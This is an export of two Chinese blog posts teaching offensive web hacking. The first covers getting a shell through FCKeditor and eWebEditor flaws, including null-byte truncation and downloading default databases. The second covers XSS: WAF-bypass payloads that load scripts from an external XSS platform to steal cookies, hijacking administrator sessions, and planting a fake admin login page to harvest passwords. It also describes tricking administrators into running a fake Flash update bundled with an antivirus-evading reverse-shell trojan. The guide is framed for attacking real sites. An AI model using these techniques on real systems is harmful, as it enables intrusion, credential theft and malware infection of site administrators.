[{"title":"编辑器漏洞","url":"/2024/12/09/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/","content":"\n编辑器配合解析漏洞利用\n编辑器自身的漏洞利用\n比如说我们要搭建一个博客，就可能用到 wordpress、emlog、zblog，那比如我要搭建一个论坛，就可能用到 dz，搭建企业网站可能会用到 dedecms 等等这些 CMS，这些CMS的源码里面就可能会调用一些编辑器，比如说：eweb、fck、kindeditor、ueditor、ckfinder、texteditor，这些编辑器都是有专门的团队运营开发的，我们可以直接在CMS写好之后，直接使用接口进行调用就可以了\n源码本身可能没有漏洞，但是编辑器可能存在漏洞。如果网站本身找不到漏洞的话，我们就可以侧重于挖掘一下编辑器漏洞\n\n 编辑器路径查找\n\n\n\n\n确定编辑器\n网站可能会存在多个编辑器\n端口搭建的站点 经常存在编辑器漏洞\n编辑器不一定在根目录下面，也可能在二级目录下面\n一般情况下，带有 editor 或 edit 的都是编辑器的目录\n编辑器还会有一些固定的目录：ewebeditor.asp/htm 或 html 可以尝试访问一下\n\n\n找编辑器版本对应的漏洞\n\n\n漏洞利用\n\n\n\n FCK编辑器漏洞\n\nfckeditor\n一般放在根目录\n有可能也放在admin目录下\ninclude目录下 echosp cms\n\n\n一般存在 /usrfiles/image 这种目录都是使用的 FCK编辑器\n\nfck  ==&gt;  更新之后：ckeditor（漏洞相对较少）\n针对于版本漏洞利用\nfck &lt; 2.6.4\nfck配合解析漏洞利用\n看看网站容器有没有可以利用的解析漏洞\n查看编辑器版本找上传点 找漏洞利用\nIIS6.0存在很多解析漏洞，可以在上传文件的时候进行利用，比如：目录解析、畸形文件名解析、分号解析\n利用截断直接 getshell ：\n\n点前截断：1.asp%00.jpg （这个大概率会被再次解析为 jpg 文件）\n点后截断：1.asp%00jpg （选中 %00，然后 ctrl+shift+u 进行编码）\n\n\n\n版本：2.4\n\n配合解析漏洞\n利用%00截断getshell\n\n版本：2.5\n\n\n利用解析漏洞 递归创建 a.asp/1.asp\n\n\n利用%00截断getshell：a.asp%00jpg a.asp%00.jpg 这两种截断都要进行一下尝试\n如果碰到阿里云，上传后的文件名会被改为 a_asp，还会封你 IP\n解决方案：换 ip上传，截断连发三个包\n\na_asp\na(1)_asp\na(1).asp\n\n这种适用于 2.4.3 以下的，因为2.6.4以上的就会重命名为时间戳\n\n\n版本：2.6.3\n\n\n依旧可以尝试抓包进行截断：\n版本要求：[2.6.0，2.6.3]\n截断格式：URL %2F 00截断\n\n%2Fa.php%00：%2F是它本身就有的也就是/，我们可以上传一个1.jpg文件，然后抓包直接在%2F后面跟一个 a.php 之后使用 %00 截断，这样就可以在image目录下面创建出：image/a.php/1.jpg\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n EWEB编辑器漏洞\n\n\n\n找后台-登录后台-修改上传类型或上传样式，-getshell\neweb后台\newebeditor目录下：\nadmin/login.asp/php/aspx/jsp\nadmin_login.asp\nadmin_style.asp\n想办法登录后台：\n\n\n尝试弱口令\n\n\n爆破\n\n\n下载默认数据库地址（可以尝试一下下面的地址，如果有数据库的话会直接下载）\n/ewebeditor/db/ewebeditor.mdb\n/ewebeditor/db/%23ewebeditor.mdb (有一些如果把#修改为%23就可以下载数据库)\n/ewebeditor/db/data.mdb\n/ewebeditor/db/db.mdb\n适用于03 iis6.版本可以下载，如果是08以上的服务器，禁止下载mdb文件\n\n\n注入得到账号密码\n\n\n\n\n如果没后台-或者进不去后台\n通过目录遍历漏洞（…/…），找网站数据库地址，下载网站数据库 解密-登录网站后台-getshell\n百度查找编辑器对应漏洞利用，找相关的EXP\n如果之前被别人修改过上传类型，可以下载数据库查看类型样式id，构造上传getshell\n\n\n\n 其他编辑器利用\n CKFinder任意文件上传漏洞\n\n 南方数据编辑器southidceditor\n\n\n ueditor\n\n DotNetTextBox编辑器漏洞\n\n\n phpweb网站管理系统后台kedit编辑器\n\n Cute Editor在线编辑器本地包含漏洞\n\n Cute Editor Asp.Net版利用iis解析漏洞获得权限\n\n","tags":["内网渗透"]},{"title":"XSS跨站漏洞","url":"/2024/12/14/XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/","content":"\n存在xss漏洞的站点：\n企业站点\n测管理员经常上线的站点\n借助社工 让管理员登录后台触发漏洞\n利用：\ncookie盗取 欺骗管理员身份登录后台\n钓鱼\n黑帽seo js代码\n快照劫持 页面跳转 蜘蛛劫持 钓鱼 等一系列攻击\n根目录/首页 head头标签里面的script代码\n\n 跨站脚本的实例：\n\n\n XSS分类\n 反射型XSS\n\n\n 存储型XSS\n\n\n DOM型XSS\n\n XSS漏洞挖掘\n 手工挖掘XSS\n\n\n\n闭合\n&lt;td&gt;123&lt;/td&gt;#插入的内容：123&lt;/td&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;td&gt;123&lt;/td&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;/td&gt;这么一来就把前面的标签闭合了\n比如说我们找到了一个可以注入的地方，可以先看一眼前端代码来确定一下他的闭合方式，然后来绕过\n\n\n\n长度限制\n\n\n长度限制（前台限制）\n修改表单长度（maxlength）、burp抓包修改\n\n\n后台服务器/代码限制\n这种只能缩短代码长度\n&lt;script src=http://xssye.com/sluJ&gt;&lt;/script&gt; &lt;!-- 如何将其缩短？1. &lt;script src=http://xssye.com/sluJ&gt;2. &lt;script/src=//xssye.com/sluJ&gt;如果想要继续缩短的话，就可以使用 URL短网址\n\n\n\n\n防护（代码防护、waf 防护）\n前后台标签不一致：可以通过前台标签推理后台标签\n如果不知道后台标签的情况下，可以尝试盲闭合（把所有的情况都写一遍）：\n&#x27;&quot;/&gt;&lt;/tr&gt;&lt;/td&gt;&lt;/div&gt;&lt;/li&gt;&lt;/textarea&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;!-- 闭合单引号、双引号还有标签啥的 --&gt;\n\n\n通用型防护\n根据防护的位置方式方法\n&lt;s&lt;x&gt;cript/src=//t.cn/sluJ&gt;&lt;/sc&lt;x&gt;ript&gt;&lt;!-- 这种要防护的话就得找黑名单之外的标签调用了，简单一点的可以双写啥的去绕过 --&gt;&lt;script/**/src=//t.cn/sluJ&gt;&lt;!-- 使用内联注释绕过\ncsp 防护：不允许调用外部的 js 进行执行，可以借助一些 fram 标签来过滤掉\n\n\nwaf防护（d盾、360、云锁）\n&lt;script/src=//xssye.com/sluJ&gt; &lt;!-- 这种可以过云锁 --&gt;\n\n像这种，使用了 img 标签，然后 src 指定一个 x，这样一定会报错，一旦报错就会执行后面的 eval 命令（这里过滤了script）\n里面的 atob 使用来解码 base64 的\n\n\n\n\n\n位置问题\n挖掘的位置：\n\n\n反射型XSS\n搜索框、URL参数位置、挖掘你提交的内容在页面中有回显的地方\n\n\n存储型XSS\n可以写入数据库中的，并且会被调用\n\n\n留言\n\n\n注册（用户名，个人资料，支付宝，微信，备注，留言，银行卡信息）\n\n\n登录（用户名、管理后台 登录账号会有登录日志 ==&gt; lvycms3.0漏洞、client-ip、x-forwarded-for、请求头）\n\n\n修改资料、提交工单、打款备注、订单系统（备注位置存在很多）\n\n\n\n\n\n\n XSS 的编码\n\n html实体编码\n\n\n将上述代码进行编码（HTML转义）：\n\n我们将转义之后的编码直接写到 html 文件里面运行，查看运行结果\n\n可以看到直接被解码然后输出出来了，并没有被运行（解一次码，然后当做字符串输出），那我们应该怎么写？\n可以单纯将内容进行编码，不对标签进行编码\n\n\n再次访问发现图片可以被显示出来了（所以不可以把整条语句都进行编码，只编码值就可以）\n\n那我们再进行一下测试，这次我们把 src=也进行编码，看看结果如何\n\n\n\n\n所以我们要对这种进行html实体编码同时要可以运行：\n\n从属性的值开始编码，要留下属性的名称，比如：src=\n不能把属性进行编码，也不能直接把整个标签全部进行编码\n\n\n 进制类编码\n\n\n对需要执行的代码进行编码，其他的地方不要乱编码\n\n Unicode 编码\n\n\n在反射型 URL 当中可以尝试 Unicode 编码\nJS 代码加密：如果 WAF 拦截代码的话\n可以尝试进行双重编码，比如 JS+html 编码\n\n 工具挖掘\n\nAWVS、burp、OWASP、BruteXSS\n\n XSS cookie 盗取\n可以使用盗取到的cookie直接登录到目标网站\n 存储型XSS盗取cookie\n我们先找到一个可以上传的地方，同时上传的最终地点是数据库，比如留言板，然后在留言的位置直接插入XSS代码，但是要注意尝试闭合，比如留言的位置就可以使用  标签进行闭合，然后其他位置可以查看前端代码来猜测应该使用什么标签进行闭合，然后那种有长度限制的，比如这里的QQ还有邮箱，我们就可以尝试直接抓包来修改长度限制。\n\n然后我们进入到管理员后台进行查看\n\n\n标签闭合成功，代码成功执行，然后我们返回到一个 XSS 平台进行查看\n\n可以看到返回了一个管理后台的地址以及管理员cookie，这个时候我们就可以尝试 cookie 注入了，进入到管理员的后台管理系统，使用刚刚劫持到的cookie直接伪造成管理员的身份进行登录，绕过登录【其中这个的管理员地址以及cookie的传播过程会被捕捉到，可以直接在网络里面进行查看】\n\n\n 反射型XSS盗取cookie\n将 XSS 代码插入到 URL 当中，只要诱导管理员点击这个 URL 就可以拿到管理员的 cookie\n\n但是这种 URL 一眼就可以看出来是带有XSS的，所以我们需要伪造一下，比如：发送一个页面，就类似下面这种：上面的页面输入正常页面，然后插入一张图片对应的 SRC 是一个反射型 URL，然后我们将这个 HTML 页面使用邮箱发送给受害者，一旦受害者打开这个 HTML 页面，我们就可以在XSS平台接收到他的 cookie\n\n\n建立session会话控制：\ncookie 是有有效期的，一般是7天或者是1个月，如果管理员修改了密码，那么cookie就会失效，我们可以设置一个短信提醒，提前进入到管理员后台，将 cookie 换为 session，这样就算 cookie 被修改了也可以维持登录状态\n保持 session：理论上，只要我们不退出后台，session就会一直有效，但是像安全狗这种类型的WAF他会强制设置session为30分钟有效期，时间一过就会强制退出重新登录\n我们可以使用鼠标点击器来重复上述的点击操作，然后想要使用的话就 F7 退出进行操作\n\n\nhttp-only 只读cookie\nawvs：如果没有启用就会报一个中危漏洞\n一旦被启用的话，就只能打到管理员后台（会返回一个地址），返回的cookie没有用或者返回为空（打不到cookie）\n\n http-only 启用时的攻击\n\n\n启用了 http-only，我们无法获取cookie\n\n\n钓鱼（ 通过伪造管理员后台盗取管理员账号 ）\n\n我们使用客户端浏览器将代码植入到目标网站的后台里面，管理员登录到后台之后触发代码就会弹出一个登录界面，这个界面就是我们使用VPS搭建的一个钓鱼页面，管理员一旦登录，我们就可以获取到他的账号以及密码，然后这些信息会保存到我们VPS的数据库当中\n这里介绍一个工具 httrack，这个工具可以用来下载网站上的一些源码（通过网站的 URL 来下载），使用这个是为了防止不同操作系统之间的编码问题导致的乱码问题（这个工具可以直接在 kali 上使用）\n【钓鱼实例】\n\n\n首先我们使用 httrack 工具将要攻击的网站的源码下载下来，然后利用这些前端源码，将网站搭建在我们的 VPS 上面，这里我们在本地测试一下，使用小皮搭建一个站点进行测试\n\n\n将下载好的源码放到小皮的根目录下，之后我们需要修改一些参数，比如跳转的地址以及数据库的name\n\n\n\n\n然后我们还需要两个php文件，一个是index.php，一个是tz.php文件\nindex.php 文件：\n\n这个文件的主要内容就是他会接收两个参数，一个 username 和一个 password，同时会将这两个参数保存到一个admin表里面，这个表有两列，一个是 username列，一个是 password列，然后开头是一个连接数据库的命令，就是本地的数据库（如果有 VPS 就修改成 VPS 的地址），然后是数据库的账密以及指定的数据库 dd。总结就是会将接收到的账密发送到指定的数据库当中。注意开头还 include了一个 tz.php\ntz.php 文件：\n用来让管理员跳转到真正的后台地址的\n\n\n\n然后就是最重要的一步，我们怎么才可以将这个钓鱼页面上传到目标的后台，这个时候就可以利用存储型XSS\n\n\n\n\n然后我们切换到管理员视角，我们先进入到管理员后台\n\n一点击这个等审留言就会跳转到钓鱼页面\n\n然后管理员就会进行登录，这个时候账密就会被传输到 VPS 的数据库上面，然后页面再次跳转，跳转到管理后台登录的首页，但是管理员只会认为需要重复登录，然后登录成功就会进入到后台页面\n\n然后我们查看一下VPS的数据库，可以看到账密已经被记录下来了\n\n\n\n当然我们也可以直接使用 XSS 平台来实现这种效果，就是将最后那个Windows跳转的代码写入到一个模块里面，然后创建一个项目引用这个模块\n\n\n\n钓鱼（合成flash -更新升级exe程序来获取管理员pc权限）【难点：免杀以及伪造】\n思路：下载一个flash升级页面\n\n伪造一个flash的升级页面，想办法让他跳转到这个页面下载flash，然后我们将正常的flash软件和我们的木马进行捆绑，只要他下载升级了，我们的木马就会运行（给木马做一个免杀）\n\n\n首先我们需要使用 MSF 生成一个反弹 shell 的 exe 可执行文件（木马 =&gt; 记得给木马做一个免杀）\n\n\n\n开启监听\n\n\n\n\n使用 httrack 下载 flash 的页面，方便后序进行钓鱼\n\n其他的都做的一模一样了，唯一需要修改的就是这些参数还有这个立即下载的样式，这个就是前端的东西了，还有就是点击下载之后会跳出一个flash.exe文件的下载，这个我们也要根据原版的样式进行模拟，然后我们可以注册一个 flash.top 这种类似的域名，和我们的 VPS 绑定一下，还有就是要修改一下网站的 icon\n\n\n然后就是将 flash的那个软件和我们的木马进行捆绑\n\n我们只需要创建一个自解压格式的压缩文件，然后修改一下压缩文件的名称就可以，他会自动生成exe类型的文件\n然后我们还需要修改一下他的设置\n\n\n\n\n最后我们只需要修改一下这个新生成的文件的图标就可以\n\n\n然后就是钓鱼用的XSS代码，我们只需要将最后的地址修改为我们VPS的地址就可以\n\n使用上述的代码在XSS平台创建一个模块，然后利用这个模块创建一个项目，之后利用生成的XSS代码进行钓鱼\n\n\n我们将上面生成的XSS代码插入到留言板里面，当管理员访问后台的时候就会跳转\n\n然后我们点击立即下载，可以看到下载成功了\n\n然后我们点击运行，可以看到 flash 的软件以及木马都被执行了，后台的会话也成功建立了\n\n\n\n\n\n\n\n\n\n beef-XSS\n参考文章：beef-xss详细教程\n\n我们需要利用上述的XSS代码进行测试，将他放到留言板插入到数据库当中\n\n\n进入到管理页面可以看到XSS已经被执行了，然后我们去管理面板看看有没有上线，可以看到已经成功上线了，然后就可以进行一系列操作了，比如：可以获取到管理后台的表单、管理员的cookie、超链接等等\n\n\n\n这个时候问题来了，这个 beef-xss 只能在我们本地 kali 运行起来，所以利用的地址也是我们本地的，那要怎么拿去钓鱼呢？可以使用 ngrock 进行代理转发\n我们只需要修改一下beef的配置文件，将端口修改为 ngrock 转发到本地的端口，然后我们就可以利用 ngrock 给的公网的地址进行钓鱼了\n\n\n XSS平台的搭建\n参考文章：手把手教你搭建XSS平台_xss平台搭建-CSDN博客\n","tags":["web漏洞"]}]